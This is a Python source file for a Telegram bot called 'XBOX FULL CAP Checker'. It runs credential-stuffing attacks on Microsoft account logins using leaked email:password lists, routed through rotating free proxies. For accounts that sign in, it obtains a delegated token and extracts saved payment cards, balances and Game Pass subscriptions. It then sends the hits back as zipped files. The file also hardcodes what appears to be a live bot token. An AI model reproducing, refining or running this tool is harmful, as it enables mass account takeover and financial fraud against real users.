import asyncio
import aiohttp
import base64
import json
import logging
import os
import random
import re
import time
import zipfile
import shutil
import uuid
from urllib.parse import quote, urlparse, parse_qs
from aiohttp import web
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = "8801077796:AAHifPZ3Kl8tCyqMOPmacBFry2KIwnNHTGQ"
ADMIN_IDS = [7595790309]
USE_PROXIES = True 

MAX_CONCURRENT = 15
TIMEOUT = 30
TEMP_DIR = "./temp"

CLIENT_ID = "0000000048170EF2"
ATK_CLIENT_ID = "000000000004773A"

UA_EDGE = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("nyx")
os.makedirs(TEMP_DIR, exist_ok=True)

# ============================================================
# PROXIES
# ============================================================
async def fetch_proxies() -> list:
    if not USE_PROXIES: return []
    url = "https://freeproxiesbyvortex.lovable.app/proxies"
    proxies = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=15) as resp:
                html = await resp.text()
        pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b'
        matches = re.findall(pattern, html)
        seen = set()
        for m in matches:
            if m not in seen:
                seen.add(m)
                proxies.append(f"http://{m}")
    except Exception as e:
        log.error(f"Proxy fetch failed: {e}")
    return proxies

PROXIES = []
def pick_proxy():
    if PROXIES and USE_PROXIES:
        return random.choice(PROXIES)
    return None

# ============================================================
# HELPERS
# ============================================================
def parse_lr(text, left, right):
    try:
        s = text.index(left) + len(left)
        e = text.index(right, s)
        return text[s:e]
    except ValueError:
        return ""

def _extract_server_data(body):
    m = re.search(r'ServerData\s*=\s*(\{.*?\})\s*;', body, re.DOTALL)
    if not m:
        return {}
    try:
        return json.loads(m.group(1))
    except Exception:
        return {}

# ============================================================
# CHECK LOGIC (From XBOX NEW API CHECKER)
# ============================================================
async def fetch_login_page(session, email, proxy):
    uaid = uuid.uuid4().hex
    url = (
        "https://login.live.com/oauth20_authorize.srf"
        f"?client_id={CLIENT_ID}"
        "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
        "&response_type=token"
        "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
        "&display=touch"
        f"&username={quote(email)}"
        f"&uaid={uaid}"
    )
    headers = {
        "User-Agent": UA_EDGE,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        async with session.get(url, headers=headers, proxy=proxy, allow_redirects=True, timeout=TIMEOUT) as resp:
            body = await resp.text()
            final_url = str(resp.url)
    except Exception:
        return {"ok": False, "reason": "Connection error"}

    sd = _extract_server_data(body)
    ppft = ""
    if sd:
        ft = sd.get("sFTTag", "")
        m = re.search(r'value="([^"]+)"', ft)
        if m: ppft = m.group(1)
        if not ppft: ppft = sd.get("sFT", "")
    if not ppft:
        ppft = (
            parse_lr(body, 'name="PPFT" id="i0327" value="', '"')
            or parse_lr(body, 'name="PPFT" value="', '"')
            or parse_lr(body, '"sFT":"', '"')
        )

    post_url = sd.get("urlPost", "") if sd else ""
    if not post_url or "ppsecure" not in post_url:
        post_url = parse_lr(body, 'action="', '"')
    if not post_url or "ppsecure" not in post_url:
        qs = parse_qs(urlparse(final_url).query)
        uid = qs.get("uaid", [uaid])[0]
        post_url = f"https://login.live.com/ppsecure/post.srf?client_id={CLIENT_ID}&uaid={uid}&pid=15216"

    if not ppft:
        return {"ok": False, "reason": "Failed PPFT"}

    return {
        "ok": True,
        "ppft": ppft,
        "post_url": post_url,
        "canary": sd.get("sCanary", "") if sd else "",
        "ctx": sd.get("sCtx", "") if sd else "",
        "uaid": parse_qs(urlparse(final_url).query).get("uaid", [uaid])[0],
    }

async def step_login(session, email, password, proxy):
    page = await fetch_login_page(session, email, proxy)
    if not page["ok"]:
        return {"status": "fail", "reason": page["reason"]}

    ppft = page["ppft"]
    post_url = page["post_url"]
    ctx = page.get("ctx", "")
    if not ctx and post_url:
        ctx = parse_qs(urlparse(post_url).query).get("ctx", [""])[0]

    payload = {
        "ps": "2", "psRNGCDefaultType": "", "psRNGCEntropy": "", "psRNGCSLK": "",
        "canary": page.get("canary", ""), "ctx": ctx, "hpgrequestid": "",
        "PPFT": ppft, "PPSX": "PassportRN", "NewUser": "1", "FoundMSAs": "",
        "fspost": "0", "i21": "0", "CookieDisclosure": "0", "IsFidoSupported": "1",
        "isSignupPost": "0", "isRecoveryAttemptPost": "0", "i13": "1",
        "login": email, "loginfmt": email, "type": "11", "LoginOptions": "1",
        "lrt": "", "lrtPartition": "", "hisRegion": "", "hisScaleUnit": "",
        "passwd": password,
    }

    referer = (
        f"https://login.live.com/oauth20_authorize.srf?client_id={CLIENT_ID}"
        "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
        "&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
        f"&display=touch&username={quote(email)}"
    )
    headers = {
        "User-Agent": UA_EDGE,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "login.live.com",
        "Origin": "https://login.live.com",
        "Referer": referer,
    }

    try:
        async with session.post(post_url, data=payload, headers=headers, proxy=proxy, allow_redirects=True, timeout=TIMEOUT) as resp:
            body = await resp.text()
            final_url = str(resp.url)
            cookies = {c.key: c.value for c in session.cookie_jar}
    except Exception:
        return {"status": "fail", "reason": "Connection error"}

    if any(k in body for k in ["Your account or password is incorrect.", "That Microsoft account doesn't exist. Enter a different account", "Sign in to your Microsoft account"]):
        return {"status": "fail", "reason": "Invalid credentials"}
    if "timed out" in body:
        return {"status": "fail", "reason": "Timeout"}
    if ",AC:null,urlFedConvertRename" in body:
        return {"status": "ban", "reason": "IP Blocked"}

    for kw in ["account.live.com/recover?mkt", "recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/cancel?mkt=", "/Abuse?mkt="]:
        if kw in body or kw in final_url:
            return {"status": "2fa", "reason": "2FA/Custom"}

    if "ANON" in cookies or "WLSSC" in cookies or "access_token=" in final_url:
        return {"status": "success"}

    return {"status": "fail", "reason": "Unknown error"}

async def step_get_atk(session, proxy):
    url = (
        "https://login.live.com/oauth20_authorize.srf"
        f"?client_id={ATK_CLIENT_ID}"
        "&response_type=token"
        "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
        "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
        "&prompt=none"
    )
    headers = {"User-Agent": UA_EDGE}
    try:
        async with session.get(url, headers=headers, proxy=proxy, allow_redirects=True, timeout=TIMEOUT) as resp:
            final_url = str(resp.url)
            atk = parse_lr(final_url, "access_token=", "&token_type") or parse_lr(final_url, "access_token=", "&")
            return atk
    except Exception:
        return ""

async def check_payment(session, atk, proxy):
    url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
    headers = {
        "User-Agent": UA_EDGE,
        "Accept": "application/json",
        "Authorization": f'MSADELEGATE1.0="{atk}"',
    }
    try:
        async with session.get(url, headers=headers, proxy=proxy, timeout=TIMEOUT) as resp:
            body = await resp.text()
            cards = []
            balance = ""
            if "lastFourDigits" in body:
                data = json.loads(body)
                instruments = data.get("items", data.get("paymentInstruments", []))
                if isinstance(instruments, list):
                    for item in instruments:
                        last4 = item.get("lastFourDigits", "")
                        if not last4: continue
                        cards.append({
                            "holder": item.get("accountHolderName", ""),
                            "name": item.get("display", {}).get("name", ""),
                            "last4": last4,
                            "expiry": f"{item.get('expiryMonth', '')}/{item.get('expiryYear', '')}",
                            "type": item.get("cardType", ""),
                        })
            bal_raw = parse_lr(body, 'balance":', ',"')
            if bal_raw: balance = bal_raw.strip().strip('"')
            return {"cards": cards, "balance": balance}
    except Exception:
        return {"cards": [], "balance": ""}

async def check_transactions(session, atk, proxy):
    url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
    headers = {
        "User-Agent": UA_EDGE,
        "Accept": "application/json",
        "Authorization": f'MSADELEGATE1.0="{atk}"',
    }
    try:
        async with session.get(url, headers=headers, proxy=proxy, timeout=TIMEOUT) as resp:
            body = await resp.text()
            subs = []
            orders = []
            if '"title":"' in body:
                for chunk in body.split('"title":"')[1:]:
                    title = parse_lr(chunk, "", '"')
                    subs.append({"title": title})
            return {"subs": subs, "orders": orders}
    except Exception:
        return {"subs": [], "orders": []}

async def check_account(session, email, password):
    proxy = pick_proxy()
    result = {"email": email, "password": password, "status": "BAD", "detail": ""}

    login = await step_login(session, email, password, proxy)
    if login["status"] != "success":
        result["status"] = login["status"]
        result["detail"] = login.get("reason", "")
        return result

    atk = await step_get_atk(session, proxy)
    if not atk:
        result["status"] = "fail"
        result["detail"] = "No ATK"
        return result

    payment = await check_payment(session, atk, proxy)
    txn = await check_transactions(session, atk, proxy)

    result["status"] = "HIT"
    result["cards"] = payment["cards"]
    result["balance"] = payment["balance"]
    result["subs"] = txn["subs"]
    
    # Format for output
    details = []
    if payment["balance"]: details.append(f"Bal: {payment['balance']}")
    if payment["cards"]: details.append(f"Cards: {len(payment['cards'])}")
    if txn["subs"]: details.append(f"Subs: {txn['subs'][0]['title']}")
    
    result["detail"] = " | ".join(details)
    return result

# ============================================================
# PROCESSING & TELEGRAM
# ============================================================
async def process_combos(combos, chat_id, status_msg, bot):
    results, done, total, t_start, last_edit = [], 0, len(combos), time.time(), 0.0
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT * 2, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar(unsafe=True)) as session:
        async def worker(email, password):
            nonlocal done, last_edit
            async with sem:
                r = await check_account(session, email, password)
            results.append(r)
            done += 1
            now = time.time()
            
            if now - last_edit >= 4.0 or done == total:
                last_edit = now
                hits = sum(1 for x in results if x["status"] == "HIT")
                bad = sum(1 for x in results if x["status"] == "fail")
                tfa = sum(1 for x in results if x["status"] == "2fa")
                ban = sum(1 for x in results if x["status"] == "ban")
                err = sum(1 for x in results if x["status"] not in ("HIT", "fail", "2fa", "ban"))
                elapsed = now - t_start
                try:
                    await status_msg.edit_text(f"<b>Checking...</b>\nprogress: <code>{done}/{total}</code>\nhits: <b>{hits}</b> | 2fa: <b>{tfa}</b> | ban: <b>{ban}</b>\nbad: <b>{bad}</b> | err: <b>{err}</b>\nspeed: <code>{int((done/elapsed)*60)} cpm</code> | {elapsed:.1f}s", parse_mode=ParseMode.HTML)
                except: pass
                
        await asyncio.gather(*(worker(e, p) for e, p in combos))

    elapsed = time.time() - t_start
    hits = [r for r in results if r["status"] == "HIT"]
    bad = [r for r in results if r["status"] == "fail"]
    tfa = [r for r in results if r["status"] == "2fa"]
    banned = [r for r in results if r["status"] == "ban"]
    errors = [r for r in results if r["status"] not in ("HIT", "fail", "2fa", "ban")]

    ts = int(time.time())
    workdir = os.path.join(TEMP_DIR, f"run_{ts}")
    os.makedirs(workdir, exist_ok=True)

    def write_file(name, lines):
        with open(os.path.join(workdir, name), "w") as f: f.write("\n".join(lines))

    write_file("hits.txt", [f"{r['email']}:{r['password']} | {r['detail']}" for r in hits])
    write_file("bad.txt", [f"{r['email']}:{r['password']}" for r in bad])
    write_file("2fa.txt", [f"{r['email']}:{r['password']}" for r in tfa])
    write_file("banned.txt", [f"{r['email']}:{r['password']}" for r in banned])
    
    cards_out = []
    subs_out = []
    for r in hits:
        for c in r.get("cards", []):
            cards_out.append(f"{r['email']}:{r['password']} | {c['name']} *{c['last4']} | {c['expiry']}")
        for s in r.get("subs", []):
            subs_out.append(f"{r['email']}:{r['password']} | {s['title']}")

    write_file("xbox_cards.txt", cards_out if cards_out else ["No cards found"])
    write_file("gamepass.txt", subs_out if subs_out else ["No subs found"])

    zip_path = os.path.join(TEMP_DIR, f"results_{ts}.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for fname in os.listdir(workdir): zf.write(os.path.join(workdir, fname), arcname=fname)

    await status_msg.edit_text(f"<b>✅ done</b>\n\ntotal: <code>{total}</code>\nhits: <b>{len(hits)}</b>\ntime: <code>{elapsed:.1f}s</code>", parse_mode=ParseMode.HTML)
    await bot.send_document(chat_id, FSInputFile(zip_path, filename=f"results_{len(hits)}_hits.zip"))
    shutil.rmtree(workdir, ignore_errors=True)
    try: os.remove(zip_path)
    except: pass

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(msg: types.Message):
    if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS: return await msg.answer("not authorized.")
    await msg.answer("<b>XBOX FULL CAP Checker</b>\n\nsend a .txt file with <code>email:password</code> combos\none per line.")

@dp.message(F.document)
async def handle_file(msg: types.Message):
    if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS: return
    if not msg.document.file_name.lower().endswith(".txt"): return await msg.answer("send a .txt file.")
    status = await msg.answer("downloading...")
    local = os.path.join(TEMP_DIR, f"{msg.document.file_unique_id}.txt")
    try:
        tg = await bot.get_file(msg.document.file_id)
        await bot.download_file(tg.file_path, local)
    except Exception as e: return await status.edit_text(f"download failed: {e}")
    
    combos = []
    with open(local, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if ":" in line and not line.startswith("#") and "t.me" not in line:
                e, p = line.split(":", 1)
                if e and p: combos.append((e, p))
    os.remove(local)
    if not combos: return await status.edit_text("no valid combos found.")
    await status.edit_text(f"loaded <code>{len(combos)}</code> combos — starting...")
    await process_combos(combos, msg.chat.id, status, bot)

async def web_server():
    app = web.Application()
    app.router.add_get("/", lambda r: web.Response(text="Bot is running"))
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    log.info(f"Web server started on port {port}")

async def main():
    asyncio.create_task(web_server())
    global PROXIES
    PROXIES = await fetch_proxies()
    log.info(f"starting | proxies={len(PROXIES)}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
